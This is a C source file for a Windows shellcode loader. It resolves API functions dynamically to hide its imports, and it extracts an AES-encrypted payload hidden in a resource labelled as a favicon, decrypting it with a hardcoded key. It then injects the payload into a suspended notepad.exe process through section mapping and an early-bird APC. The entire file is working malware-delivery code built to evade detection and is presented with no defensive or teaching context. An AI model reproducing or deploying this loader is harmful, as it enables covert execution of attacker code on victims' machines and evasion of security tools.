#include <winternl.h>
#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include "resources.h"
#include "helpers.h"

// LNK4210: Cannot have global variables using this, 'global' variables declared in each func
#pragma comment(linker, "/entry:WinMain")

// Resolved function types
typedef HMODULE (WINAPI * GetModuleHandle_t)(LPCWSTR lpModuleName);
typedef FARPROC (WINAPI * GetProcAddress_t)(HMODULE hModule, LPCSTR lpProcName);
typedef HMODULE (WINAPI * LoadLibrary_t)(LPCSTR lpFileName);
typedef HRSRC (WINAPI * FindResource_t)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
typedef HGLOBAL (WINAPI * LoadResource_t)(HMODULE hModule, HRSRC hResInfo);
typedef LPVOID (WINAPI * LockResource_t)(HGLOBAL hResData);
typedef DWORD (WINAPI * SizeofResource_t)(HMODULE hModule, HRSRC hResInfo);
typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef VOID (WINAPI * RtlMoveMemory_t)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);
typedef LPVOID (WINAPI * OpenProcess_t)(DWORD dwDesiredAccess,BOOL bInheritHandle, DWORD dwProcessId);
typedef VOID (WINAPI * CloseHandle_t)(HANDLE hObject);
typedef LPVOID (WINAPI * VirtualAllocEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI * WriteProcessMemory_t)(HANDLE  hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
typedef BOOL (WINAPI * VirtualProtectEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef HANDLE (WINAPI * CreateRemoteThread_t)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef BOOL (WINAPI * WaitForSingleObject_t)(HANDLE hHandle, DWORD dwMilliseconds);
typedef HANDLE (WINAPI * CreateToolhelp32Snapshot_t)(DWORD dwFlags, DWORD th32ProcessID);
typedef BOOL (WINAPI * Process32First_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef BOOL (WINAPI * Process32Next_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef int (WINAPI * lstrcmpiA_t)(LPCSTR lpString1, LPCSTR lpString2);
typedef BOOL (WINAPI * CryptAcquireContextW_t)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
typedef BOOL (WINAPI * CryptCreateHash_t)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash);
typedef BOOL (WINAPI * CryptHashData_t)(HCRYPTHASH hHash, const BYTE *pbData, DWORD dwDataLen, DWORD dwFlags);
typedef BOOL (WINAPI * CryptDeriveKey_t)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY *phKey);
typedef BOOL (WINAPI * CryptDecrypt_t)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
typedef BOOL (WINAPI * CryptReleaseContext_t)(HCRYPTPROV hProv, DWORD dwFlags);
typedef BOOL (WINAPI * CryptDestroyHash_t)(HCRYPTHASH hHash);
typedef BOOL (WINAPI * CryptDestroyKey_t)(HCRYPTKEY hKey);

// --------------------- MapView Delivery ---------------------
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
    PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS (NTAPI * NtCreateSection_t)(
    PHANDLE SectionHandle,
    ULONG DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG PageAttributess,
    ULONG SectionAttributes,
    HANDLE FileHandle); 

typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID * BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;


typedef HANDLE (WINAPI * GetCurrentProcess_t)();

// ------------------ End of MapView Delivery ------------------

// ------------------ Early bird APC

typedef BOOL (WINAPI * CreateProcessA_t)(
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFOA        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation);

typedef BOOL (WINAPI * QueueUserAPC_t)(
    PAPCFUNC  pfnAPC,
    HANDLE    hThread,
    ULONG_PTR dwData);

typedef DWORD (WINAPI * ResumeThread_t)(HANDLE hThread);

// -------------- APC


void XOR(char *data, size_t data_len, char *key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    // Global 'variables'
    GetModuleHandle_t pGetModuleHandle = (GetModuleHandle_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleHandleW");
    GetProcAddress_t pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetProcAddress");
    CloseHandle_t pCloseHandle = (CloseHandle_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "CloseHandle");

    // Load crypto DLL
    LoadLibrary_t pLoadLibraryA = (LoadLibrary_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "LoadLibraryA");
    HMODULE hCryptModule = pLoadLibraryA("ADVAPI32.DLL");

    // Resolved functions
    CryptAcquireContextW_t pCryptAcquireContextW = (CryptAcquireContextW_t) pGetProcAddress(pGetModuleHandle(L"ADVAPI32.DLL"), "CryptAcquireContextW");
    CryptCreateHash_t pCryptCreateHash = (CryptCreateHash_t) pGetProcAddress(pGetModuleHandle(L"ADVAPI32.DLL"), "CryptCreateHash");
    CryptHashData_t pCryptHashData = (CryptHashData_t) pGetProcAddress(pGetModuleHandle(L"ADVAPI32.DLL"), "CryptHashData");
    CryptDeriveKey_t pCryptDeriveKey = (CryptDeriveKey_t) pGetProcAddress(pGetModuleHandle(L"ADVAPI32.DLL"), "CryptDeriveKey");
    CryptDecrypt_t pCryptDecrypt = (CryptDecrypt_t) pGetProcAddress(pGetModuleHandle(L"ADVAPI32.DLL"), "CryptDecrypt");
    CryptReleaseContext_t pCryptReleaseContext = (CryptReleaseContext_t) pGetProcAddress(pGetModuleHandle(L"ADVAPI32.DLL"), "CryptReleaseContext");
    CryptDestroyHash_t pCryptDestroyHash = (CryptDestroyHash_t) pGetProcAddress(pGetModuleHandle(L"ADVAPI32.DLL"), "CryptDestroyHash");
    CryptDestroyKey_t pCryptDestroyKey = (CryptDestroyKey_t) pGetProcAddress(pGetModuleHandle(L"ADVAPI32.DLL"), "CryptDestroyKey");

    if (!pCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
        return -1;
    }
    if (!pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
        return -1;
    }
    if (!pCryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
        return -1;              
    }
    if (!pCryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
        return -1;
    }
    
    if (!pCryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
        return -1;
    }
    
    pCryptReleaseContext(hProv, 0);
    pCryptDestroyHash(hHash);
    pCryptDestroyKey(hKey);
    
    return 0;
}

int FindTarget(const char *procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    // 'Global' variables
    GetModuleHandle_t pGetModuleHandle = (GetModuleHandle_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleHandleW");
    GetProcAddress_t pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetProcAddress");
    CloseHandle_t pCloseHandle = (CloseHandle_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "CloseHandle");

    // Resolved functions
    CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "CreateToolhelp32Snapshot");
    Process32First_t pProcess32First = (Process32First_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "Process32First");
    Process32Next_t pProcess32Next = (Process32Next_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "Process32Next");
    lstrcmpiA_t plstrcmpiA = (lstrcmpiA_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "lstrcmpiA");
            
    hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
            
    pe32.dwSize = sizeof(PROCESSENTRY32); 
            
    if (!pProcess32First(hProcSnap, &pe32)) {
            pCloseHandle(hProcSnap);
            return 0;
    }
            
    while (pProcess32Next(hProcSnap, &pe32)) {
            if (plstrcmpiA(procname, pe32.szExeFile) == 0) {
                    pid = pe32.th32ProcessID;
                    break;
            }
    }
            
    pCloseHandle(hProcSnap);
            
    return pid;
}

int Inject(HANDLE hProc, unsigned char *payload, unsigned int payload_len, HANDLE hThread) {
    
    // HANDLE hThread = NULL;
    HANDLE hSection = NULL;
    PVOID pLocalView = NULL, pRemoteView = NULL;
    CLIENT_ID cid;

    // 'Global' variables
    GetModuleHandle_t pGetModuleHandle = (GetModuleHandle_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleHandleW");
    GetProcAddress_t pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetProcAddress");
    // CloseHandle_t pCloseHandle = (CloseHandle_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "CloseHandle");

    // Resolved functions
    NtCreateSection_t pNtCreateSection = (NtCreateSection_t) pGetProcAddress(pGetModuleHandle(L"NTDLL.DLL"), "NtCreateSection");
    NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t) pGetProcAddress(pGetModuleHandle(L"NTDLL.DLL"), "NtMapViewOfSection");
    RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");
    GetCurrentProcess_t pGetCurrentProcess = (GetCurrentProcess_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "GetCurrentProcess");
    QueueUserAPC_t pQueueUserAPC = (QueueUserAPC_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "QueueUserAPC");
    ResumeThread_t pResumeThread = (ResumeThread_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "ResumeThread");

    // Create memory section NtCreateSection
    pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // Create local view, NtMapViewOfSection rw
    pNtMapViewOfSection(hSection, pGetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_READWRITE);

    // Move payload to view
    pRtlMoveMemory(pLocalView, payload, payload_len);
    
    // Create remote view: NEEDS TO BE XRW TO DECODE PAYLOAD (CHANGE THIS)
    pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
    
    

    pQueueUserAPC((PAPCFUNC)pRemoteView, hThread, NULL);
    pResumeThread(hThread);

    return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	void * exec_mem;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char *payload;
	unsigned int payload_len;

    unsigned char AESkey[] = { 0x5a, 0xdc, 0x9c, 0xd0, 0xfd, 0x9d, 0x46, 0xc1, 0xd9, 0xe, 0xea, 0x75, 0x99, 0x1d, 0xfc, 0x9 };

    // 'Global' variables
    GetModuleHandle_t pGetModuleHandle = (GetModuleHandle_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleHandleW");
    GetProcAddress_t pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetProcAddress");
    CloseHandle_t pCloseHandle = (CloseHandle_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "CloseHandle");

    // Resolved functions
    FindResource_t pFindResource = (FindResource_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "FindResourceA");
    LoadResource_t pLoadResource = (LoadResource_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "LoadResource");
    LockResource_t pLockResource = (LockResource_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "LockResource");
    SizeofResource_t pSizeofResource = (SizeofResource_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "SizeofResource");
    VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "VirtualAlloc");
    RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");
    OpenProcess_t pOpenProcess = (OpenProcess_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "OpenProcess");

	// Extract payload from resources section
	res = pFindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = pLoadResource(NULL, res);
	payload = (unsigned char *) pLockResource(resHandle);
	payload_len = pSizeofResource(NULL, res);

	// Allocate some memory buffer for payload
	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Decrypt payload
    AESDecrypt((char *)payload, payload_len, (char *)AESkey, sizeof(AESkey));

	// Copy payload to new memory buffer
	pRtlMoveMemory(exec_mem, payload, payload_len);



    int pid = 0;
    HANDLE hProc = NULL;
    
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    void * pRemoteCode;
    
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    // ZeroMemory

    CreateProcessA_t pCreateProcessA = (CreateProcessA_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "CreateProcessA");

    pCreateProcessA(0, "notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

    Inject(pi.hProcess, (unsigned char *)exec_mem, payload_len, pi.hThread);

	return 0;
}